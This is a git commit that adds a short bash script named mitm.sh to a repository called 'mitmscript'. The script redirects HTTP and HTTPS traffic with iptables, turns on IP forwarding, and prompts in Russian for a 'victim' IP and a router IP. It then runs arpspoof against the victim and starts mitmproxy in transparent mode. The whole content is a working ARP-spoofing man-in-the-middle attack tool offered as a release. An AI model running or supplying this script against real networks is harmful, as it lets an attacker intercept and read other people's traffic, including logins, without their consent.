66c8c520c24d4351dc968ce456e2cf51ee89af57
alexmihalyk23 <alexmihalyk23@gmail.com>
2019-04-28 22:49:36 +0700

    release v1

---
+++ README.md
@@ -0,0 +1,1 @@
+# mitmscript
---
+++ mitm.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
+echo "1" > /proc/sys/net/ipv4/ip_forward
+while [ "$net" = "" ]; do
+    echo -n "Введите ip жертвы и ip роутера через пробел "
+    read net
+    if [ -n "$net" ]; then
+        arpspoof -i wlp3s0 -t $net &
+        xterm -e "./mitm --mode transparent"
+    fi
+    killall arpspoof
+done
